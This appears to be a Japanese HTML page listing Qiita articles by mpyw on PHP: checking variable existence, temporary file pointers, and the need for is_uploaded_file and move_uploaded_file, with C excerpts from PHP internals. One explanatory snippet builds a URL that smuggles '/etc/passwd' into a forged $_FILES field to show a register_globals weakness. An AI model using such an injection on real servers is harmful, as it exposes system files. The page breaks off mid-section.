<p>PHPでは、グローバル空間にある変数を <strong>スーパーグローバル変数 <code>$GLOBALS</code></strong> で配列として取得することが出来ます。スーパーグローバル変数に関しては後で詳しく学習するので、ここでは軽く流してください。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$v2</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nv">$v3</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span>
    <span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'v1'</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">),</span>
    <span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'v2'</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">),</span>
    <span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'v3'</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">)</span>
<span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>bool(false)
bool(true)
bool(true)
</pre></div>
</div>

<h3>
<span id="関数内における変数が存在するかどうか" class="fragment"></span><a href="#%E9%96%A2%E6%95%B0%E5%86%85%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E5%A4%89%E6%95%B0%E3%81%8C%E5%AD%98%E5%9C%A8%E3%81%99%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B"><i class="fa fa-link"></i></a>関数内における変数が存在するかどうか</h3>

<p>グローバル空間では変数 <code>$GLOBALS</code> が用意されていましたが、関数内では <code>get_defined_vars</code> 関数の返り値を利用します。</p>

<p><strong>get_defined_vars</strong><br>
<a href="http://php.net/manual/ja/function.get-defined-vars.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.get-defined-vars.php</a></p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$v2</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="nv">$v3</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="nb">var_dump</span><span class="p">(</span>
        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'v1'</span><span class="p">,</span> <span class="nb">get_defined_vars</span><span class="p">()),</span>
        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'v2'</span><span class="p">,</span> <span class="nb">get_defined_vars</span><span class="p">()),</span>
        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'v3'</span><span class="p">,</span> <span class="nb">get_defined_vars</span><span class="p">())</span>
    <span class="p">);</span>
<span class="p">}</span>
<span class="nx">test</span><span class="p">();</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>bool(false)
bool(true)
bool(true)
</pre></div>
</div>

<h2>
<span id="null-と未定義を区別しようと思うな" class="fragment"></span><a href="#null-%E3%81%A8%E6%9C%AA%E5%AE%9A%E7%BE%A9%E3%82%92%E5%8C%BA%E5%88%A5%E3%81%97%E3%82%88%E3%81%86%E3%81%A8%E6%80%9D%E3%81%86%E3%81%AA"><i class="fa fa-link"></i></a><code>NULL</code> と未定義を区別しようと思うな！！！</h2>

<p>いろいろやってきましたが、正直 <strong>面倒くさい</strong> ですよね。普通に配列をチェックするだけなら素直に <code>array_key_exists</code> を使えばいいような気もしますが、<ins>動作速度は <code>isset</code> の方が速い</ins>です。</p>

<p><strong>【結論】 <code>NULL</code> と未定義の区別が必要なデータ構造は設計を誤っている。</strong></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />21位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>65</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/f24d3764fe3eedf132ff">PHPで一時的なファイルポインタを扱う方法</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-09-19 08:14:36</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="選択肢" class="fragment"></span><a href="#%E9%81%B8%E6%8A%9E%E8%82%A2"><i class="fa fa-link"></i></a>選択肢</h2>

<h3>
<span id="fp--fopenphpmemory-rb" class="fragment"></span><a href="#fp--fopenphpmemory-rb"><i class="fa fa-link"></i></a><code>$fp = fopen('php://memory', 'r+b');</code>
</h3>

<ul>
<li>メモリ上に領域を確保する。メモリリークに注意。</li>
</ul>

<h3>
<span id="fp--fopenphptemp-rb" class="fragment"></span><a href="#fp--fopenphptemp-rb"><i class="fa fa-link"></i></a><code>$fp = fopen('php://temp', 'r+b');</code>
</h3>

<ul>
<li>メモリ上に領域を確保し、 <strong>2MB</strong> を超えたら自動削除される一時ファイルを作る。</li>
</ul>

<h3>
<span id="fp--fopenphptempmaxmemoryn-rb" class="fragment"></span><a href="#fp--fopenphptempmaxmemoryn-rb"><i class="fa fa-link"></i></a><code>$fp = fopen("php://temp/maxmemory:{$n}", 'r+b');</code>
</h3>

<ul>
<li>メモリ上に領域を確保し、<code>$n</code> バイトを超えたら自動削除される一時ファイルを作る。</li>
</ul>

<h3>
<span id="file--new-spltempfileobjectn" class="fragment"></span><a href="#file--new-spltempfileobjectn"><i class="fa fa-link"></i></a><code>$file = new SplTempFileObject($n);</code>
</h3>

<ul>
<li>上記の <code>SplFileObject</code> 版 (継承クラス) 。<br>
引数は省略可能でデフォルトはもちろん <strong>2MB (2 * 1024 * 1024 )</strong> 。 <strong>0</strong> にすることも可能。<br>
OOP好きな人はこれでどうぞ。</li>
</ul>

<h3>
<span id="fp--tmpfile" class="fragment"></span><a href="#fp--tmpfile"><i class="fa fa-link"></i></a><code>$fp = tmpfile();</code>
</h3>

<ul>
<li>自動削除される一時ファイルを作る。<br>
「ファイル」に対してしか操作できない関数を扱う場合はこれが優秀。</li>
<li>これに限り、 <strong><code>stream_get_meta_data($fp)</code> で返される配列の <code>'uri'</code> 要素からファイル名を取得出来る</strong> 。</li>
</ul>

<p><a href="http://php.net/manual/ja/function.tempnam.php" rel="nofollow noopener" target="_blank">tempnam()関数</a>もあるけど、自分でファイルを削除する必要があったりして使いにくい、というか少し用途が違う気がするので割愛。</p>

<h2>
<span id="メモリが解放される一時ファイルが削除されるタイミングは" class="fragment"></span><a href="#%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%8C%E8%A7%A3%E6%94%BE%E3%81%95%E3%82%8C%E3%82%8B%E4%B8%80%E6%99%82%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%8C%E5%89%8A%E9%99%A4%E3%81%95%E3%82%8C%E3%82%8B%E3%82%BF%E3%82%A4%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%AF"><i class="fa fa-link"></i></a>メモリが解放される・一時ファイルが削除されるタイミングは？</h2>

<h3>
<span id="手続き型" class="fragment"></span><a href="#%E6%89%8B%E7%B6%9A%E3%81%8D%E5%9E%8B"><i class="fa fa-link"></i></a>手続き型</h3>

<ul>
<li>
<code>fclose($fp)</code> のようにして <strong>ファイルポインタを閉じた</strong> とき。</li>
<li>
<strong>スクリプトが終了した</strong> とき。</li>
</ul>

<del>変数コンテナのように自動的にガーベジコレクションが行われるわけではない。</del>

<p><a href="http://qiita.com/mpyw/items/60da2c08d384a53ec47e" id="reference-eba15905c3a66b228e38">訂正します。</a></p>

<h3>
<span id="オブジェクト指向型" class="fragment"></span><a href="#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E6%8C%87%E5%90%91%E5%9E%8B"><i class="fa fa-link"></i></a>オブジェクト指向型</h3>

<ul>
<li>変数のガーベジコレクションが行われると、自動的にリソースの解放も行われる。</li>
</ul>

<p>ちなみにPDOもこれに該当するため、いちいち <code>$pdo = null;</code> などとする必要は基本的には無い。</p>

<h2>
<span id="使用例" class="fragment"></span><a href="#%E4%BD%BF%E7%94%A8%E4%BE%8B"><i class="fa fa-link"></i></a>使用例</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">cURLのCookieとして用意する</span></div>
<div class="highlight"><pre><span></span><span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
<span class="nv">$meta</span> <span class="o">=</span> <span class="nb">stream_get_meta_data</span><span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">tmpfile</span><span class="p">());</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_COOKIEJAR</span><span class="p">,</span> <span class="nv">$meta</span><span class="p">[</span><span class="s1">'uri'</span><span class="p">]);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_COOKIEFILE</span><span class="p">,</span> <span class="nv">$meta</span><span class="p">[</span><span class="s1">'uri'</span><span class="p">]);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">繰り返し上記のコードが呼ばれる可能性が場合は後始末が必要</span></div>
<div class="highlight"><pre><span></span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />22位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>62</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/db12ce86b15f3b0b3c19">is_uploaded_file() / move_uploaded_file() の必要性？</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-03-21 11:51:21</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[セキュリティ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>まだ <strong><a href="http://qiita.com/mpyw/items/939964377766a54d4682" id="reference-6afbf3c60555f47e5429">「ファイルアップロードの例外処理はこれぐらいしないと気が済まない」</a></strong> をご覧になっていない方は先にそちらからどうぞ。</p>

<h1>
<span id="問題提起" class="fragment"></span><a href="#%E5%95%8F%E9%A1%8C%E6%8F%90%E8%B5%B7"><i class="fa fa-link"></i></a><strong>問題提起</strong>
</h1>

<p>ファイルアップロード関連の記事を書いているとき、いつも疑問に思っていることがあった。</p>

<p><a href="https://camo.qiitausercontent.com/8edb2bcb780662e2bcbb0c00fbea4bb4748188e9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f63376536303736382d313062382d336533362d373563372d3330333463643164633563332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8edb2bcb780662e2bcbb0c00fbea4bb4748188e9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f63376536303736382d313062382d336533362d373563372d3330333463643164633563332e706e67" alt="ss (2014-03-21 at 11.12.04).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/c7e60768-10b8-3e36-75c7-3034cd1dc5c3.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/e48fe80e4dd62d35da1b5e3894678fd42e36fa77/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f64343431383862612d643832622d633738342d656563312d3337393037366435376366642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e48fe80e4dd62d35da1b5e3894678fd42e36fa77/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f64343431383862612d643832622d633738342d656563312d3337393037366435376366642e706e67" alt="ss (2014-03-21 at 11.12.45).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/d44188ba-d82b-c784-eec1-379076d57cfd.png"></a></p>

<p>だからさぁ、 <strong>アップロードされなかったファイル</strong> の名前がどうやったら <strong><code>$_FILES['upfile']['tmp_name']</code></strong> に混入できるんだよ！？このチェックいるのかホントに！？</p>

<p>なんて思いながら「PHPマニュアルが勧めているから」という理由で訳も分からず記事を書いていた。</p>

<h1>
<span id="歴史的な理由" class="fragment"></span><a href="#%E6%AD%B4%E5%8F%B2%E7%9A%84%E3%81%AA%E7%90%86%E7%94%B1"><i class="fa fa-link"></i></a><strong>歴史的な理由</strong>
</h1>

<p>そう、実はこの関数の背景には <strong>歴史的な理由</strong> があったのだ… <strong><a href="http://www.php.net/manual/ja/security.globals.php" rel="nofollow noopener" target="_blank">register_globals</a></strong> という害悪機能の存在だ。もしこの機能が有効な場合、以下のようなURLでリクエストを受けたとき、不正に <code>/etc/passwd</code> を閲覧される可能性がある。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">printf</span><span class="p">(</span>
    <span class="s1">'&lt;a href="http://example.com/upload.php?%s"&gt;不正ファイル作成&lt;/a&gt;'</span><span class="p">,</span>
    <span class="nb">http_build_query</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
        <span class="s1">'_FILES'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">'upfile'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'passwd.txt'</span><span class="p">,</span>
                <span class="s1">'tmp_name'</span> <span class="o">=&gt;</span> <span class="s1">'/etc/passwd'</span><span class="p">,</span>
                <span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">,</span>
            <span class="p">)</span>
        <span class="p">)</span>
    <span class="p">))</span>
<span class="p">);</span>
</pre></div></div>

<p>但し、最早この機能が有効になっている環境に遭遇すること自体がレアであり、よく分からないようなレンタルサーバーであっても <strong>PHP 5</strong> であるとさえ書いてくれてあればおそらくほぼ全てのものが無効とされているだろう。というか今更、サポート切れてて、なんちゃってオブジェクト指向しか扱えないような <strong>PHP 4</strong> みたいな欠陥クソ言語使うな、うん。</p>

<h1>
<span id="php言語レベルでの考察" class="fragment"></span><a href="#php%E8%A8%80%E8%AA%9E%E3%83%AC%E3%83%99%E3%83%AB%E3%81%A7%E3%81%AE%E8%80%83%E5%AF%9F"><i class="fa fa-link"></i></a><strong>PHP言語レベルでの考察</strong>
</h1>

<h2>
<span id="register_globals-との向き合い方" class="fragment"></span><a href="#register_globals-%E3%81%A8%E3%81%AE%E5%90%91%E3%81%8D%E5%90%88%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a><strong><a href="http://www.php.net/manual/ja/security.globals.php" rel="nofollow noopener" target="_blank">register_globals</a> との向き合い方</strong>
</h2>

<p><strong><a href="http://www.php.net/manual/ja/security.globals.php" rel="nofollow noopener" target="_blank">register_globals</a></strong> がphp.iniのディレクティブから削除されたのは <strong>PHP 5.4.0</strong> のときである。</p>

<p><a href="https://camo.qiitausercontent.com/45cf2b99ef28e45cdd8d6335d56c8d44a5606ade/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f33393562353430612d393233352d643764642d326638362d3233353734336332386464372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/45cf2b99ef28e45cdd8d6335d56c8d44a5606ade/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f33393562353430612d393233352d643764642d326638362d3233353734336332386464372e706e67" alt="ss (2014-03-21 at 11.38.43).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/395b540a-9235-d7dd-2f86-235743c28dd7.png"></a></p>

<p>php.iniの設定次第で致命的な脆弱性が生まれてしまうのは気持ち悪く感じるので、これより古いバージョンを使用している場合はやはりこういったチェックを行ったほうがいいように思える…が、<ins>ファイルアップロード以外にも <strong><a href="http://www.php.net/manual/ja/security.globals.php" rel="nofollow noopener" target="_blank">register_globals</a></strong> の存在を想定していないコードは山ほどある</ins>よな…別にここだけやったところで特に意味ないよな…</p>

<h2>
<span id="上書きに関する挙動の違い" class="fragment"></span><a href="#%E4%B8%8A%E6%9B%B8%E3%81%8D%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%8C%99%E5%8B%95%E3%81%AE%E9%81%95%E3%81%84"><i class="fa fa-link"></i></a><strong>上書きに関する挙動の違い</strong>
</h2>

<p>但し、以下のような上書きに関する挙動の違いがあるので、 <strong><a href="http://www.php.net/manual/ja/function.move-uploaded-file.php" rel="nofollow noopener" target="_blank">move_uploaded_file</a></strong> 関数に限っては必要と言えるかもしれない。上書きが行えるアップロードファイルの移動が可能な関数はこれしか存在しない。もちろん</p>

<ul>
<li>テンポラリファイルはスクリプト実行後すぐ削除されてしまうからコピーでも十分</li>
<li>そもそもWindowsでPHP使ってないから大丈夫</li>
</ul>

<p>と言われればそれまでではあるが…</p>

<h4>
<span id="osを問わず上書きする" class="fragment"></span><a href="#os%E3%82%92%E5%95%8F%E3%82%8F%E3%81%9A%E4%B8%8A%E6%9B%B8%E3%81%8D%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>OSを問わず上書きする</h4>

<ul>
<li>
<strong><a href="http://www.php.net/manual/ja/function.move-uploaded-file.php" rel="nofollow noopener" target="_blank">move_uploaded_file</a></strong> 関数</li>
<li>
<strong><a href="http://www.php.net/manual/ja/function.copy.php" rel="nofollow noopener" target="_blank">copy</a></strong> 関数</li>
<li>
<strong><a href="http://www.php.net/manual/ja/function.imagepng.php" rel="nofollow noopener" target="_blank">imagepng</a></strong> 関数</li>
<li>
<strong><a href="http://www.php.net/manual/ja/function.imagejpeg.php" rel="nofollow noopener" target="_blank">imagejpeg</a></strong> 関数</li>
<li>
<strong><a href="http://www.php.net/manual/ja/function.imagegif.php" rel="nofollow noopener" target="_blank">imagegif</a></strong> 関数</li>
</ul>

<h4>
<span id="windows上でのみ-warning-を発生して処理を中止する" class="fragment"></span><a href="#windows%E4%B8%8A%E3%81%A7%E3%81%AE%E3%81%BF-warning-%E3%82%92%E7%99%BA%E7%94%9F%E3%81%97%E3%81%A6%E5%87%A6%E7%90%86%E3%82%92%E4%B8%AD%E6%AD%A2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Windows上でのみ <strong>Warning</strong> を発生して処理を中止する</h4>

<ul>
<li>
<strong><a href="http://www.php.net/manual/ja/function.rename.php" rel="nofollow noopener" target="_blank">rename</a></strong> 関数</li>
</ul>

<h1>
<span id="c言語レベルでの考察" class="fragment"></span><a href="#c%E8%A8%80%E8%AA%9E%E3%83%AC%E3%83%99%E3%83%AB%E3%81%A7%E3%81%AE%E8%80%83%E5%AF%9F"><i class="fa fa-link"></i></a><strong>C言語レベルでの考察</strong>
</h1>

<div class="code-frame" data-lang="c">
<div class="code-lang"><span class="bold">php_do_open_temporary_file関数(テンポラリファイル生成に関与)</span></div>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">php_do_open_temporary_file</span><span class="p">(</span><span class="cm">/* 省略 */</span><span class="p">)</span> <span class="p">{</span>

    <span class="cm">/* 省略 */</span>

<span class="cp">#ifndef HAVE_MKSTEMP</span>
    <span class="kt">int</span> <span class="n">open_flags</span> <span class="o">=</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span> <span class="o">|</span> <span class="n">O_RDWR</span>
<span class="cp">#ifdef PHP_WIN32</span>
        <span class="o">|</span> <span class="n">_O_BINARY</span>
<span class="cp">#endif</span>
        <span class="p">;</span>
<span class="cp">#endif</span>

    <span class="cm">/* 省略 */</span>

<span class="cp">#ifdef PHP_WIN32</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">GetTempFileName</span><span class="p">(</span><span class="n">new_state</span><span class="p">.</span><span class="n">cwd</span><span class="p">,</span> <span class="n">pfx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">opened_path</span><span class="p">))</span> <span class="p">{</span>
        <span class="cm">/* Some versions of windows set the temp file to be read-only,</span>
<span class="cm">        * which means that opening it will fail... */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">VCWD_CHMOD</span><span class="p">(</span><span class="n">opened_path</span><span class="p">,</span> <span class="mo">0600</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">efree</span><span class="p">(</span><span class="n">opened_path</span><span class="p">);</span>
            <span class="n">efree</span><span class="p">(</span><span class="n">new_state</span><span class="p">.</span><span class="n">cwd</span><span class="p">);</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">fd</span> <span class="o">=</span> <span class="n">VCWD_OPEN_MODE</span><span class="p">(</span><span class="n">opened_path</span><span class="p">,</span> <span class="n">open_flags</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
    <span class="p">}</span>
<span class="cp">#elif defined(HAVE_MKSTEMP)</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">mkstemp</span><span class="p">(</span><span class="n">opened_path</span><span class="p">);</span>
<span class="cp">#else</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mktemp</span><span class="p">(</span><span class="n">opened_path</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">fd</span> <span class="o">=</span> <span class="n">VCWD_OPEN</span><span class="p">(</span><span class="n">opened_path</span><span class="p">,</span> <span class="n">open_flags</span><span class="p">);</span>
    <span class="p">}</span>
<span class="cp">#endif</span>

    <span class="cm">/* 省略 */</span>

<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="c">
<div class="code-lang"><span class="bold">VCWD_*のマクロ定義</span></div>
<div class="highlight"><pre><span></span><span class="cp">#define VCWD_OPEN(path, flags) virtual_open(path TSRMLS_CC, flags)</span>
<span class="cp">#define VCWD_OPEN_MODE(path, flags, mode) virtual_open(path TSRMLS_CC, flags, mode)</span>
<span class="cp">#define VCWD_CREAT(path, mode) virtual_creat(path, mode TSRMLS_CC)</span>
</pre></div>
</div>

<div class="code-frame" data-lang="c">
<div class="code-lang"><span class="bold">virtual_open関数(open関数のラッパー)</span></div>
<div class="highlight"><pre><span></span><span class="n">CWD_API</span> <span class="kt">int</span> <span class="nf">virtual_open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span> <span class="n">TSRMLS_DC</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>

    <span class="cm">/* 省略 */</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">O_CREAT</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">mode_t</span> <span class="n">mode</span><span class="p">;</span>
        <span class="kt">va_list</span> <span class="n">arg</span><span class="p">;</span>
        <span class="n">va_start</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
        <span class="n">mode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">mode_t</span><span class="p">)</span> <span class="n">va_arg</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
        <span class="n">va_end</span><span class="p">(</span><span class="n">arg</span><span class="p">);</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">new_state</span><span class="p">.</span><span class="n">cwd</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">new_state</span><span class="p">.</span><span class="n">cwd</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* 省略 */</span>

<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="c">
<div class="code-lang"><span class="bold">move_uploaded_file関数のC言語レベルでの実装</span></div>
<div class="highlight"><pre><span></span><span class="n">PHP_FUNCTION</span><span class="p">(</span><span class="n">move_uploaded_file</span><span class="p">)</span> <span class="p">{</span>

    <span class="cm">/* 省略 */</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SG</span><span class="p">(</span><span class="n">rfc1867_uploaded_files</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">RETURN_FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">zend_parse_parameters</span><span class="p">(</span><span class="n">ZEND_NUM_ARGS</span><span class="p">()</span> <span class="n">TSRMLS_CC</span><span class="p">,</span> <span class="s">"ss"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">path_len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_path_len</span><span class="p">)</span> <span class="o">==</span> <span class="n">FAILURE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">zend_hash_exists</span><span class="p">(</span><span class="n">SG</span><span class="p">(</span><span class="n">rfc1867_uploaded_files</span><span class="p">),</span> <span class="n">path</span><span class="p">,</span> <span class="n">path_len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">RETURN_FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* 省略 */</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">VCWD_RENAME</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">new_path</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">successful</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">#ifndef PHP_WIN32</span>
        <span class="n">oldmask</span> <span class="o">=</span> <span class="n">umask</span><span class="p">(</span><span class="mo">077</span><span class="p">);</span>
        <span class="n">umask</span><span class="p">(</span><span class="n">oldmask</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">VCWD_CHMOD</span><span class="p">(</span><span class="n">new_path</span><span class="p">,</span> <span class="mo">0666</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">oldmask</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">php_error_docref</span><span class="p">(</span><span class="nb">NULL</span> <span class="n">TSRMLS_CC</span><span class="p">,</span> <span class="n">E_WARNING</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="p">}</span>
<span class="cp">#endif</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">php_copy_file_ex</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">new_path</span><span class="p">,</span> <span class="n">STREAM_DISABLE_OPEN_BASEDIR</span> <span class="n">TSRMLS_CC</span><span class="p">)</span> <span class="o">==</span> <span class="n">SUCCESS</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">VCWD_UNLINK</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
        <span class="n">successful</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* 省略 */</span>        

<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="テンポラリファイルのパーミッションは必ず-0600-になる" class="fragment"></span><a href="#%E3%83%86%E3%83%B3%E3%83%9D%E3%83%A9%E3%83%AA%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%91%E3%83%BC%E3%83%9F%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AF%E5%BF%85%E3%81%9A-0600-%E3%81%AB%E3%81%AA%E3%82%8B"><i class="fa fa-link"></i></a><strong>テンポラリファイルのパーミッションは必ず <code>0600</code> になる（？）</strong>
</h2>

<h3>
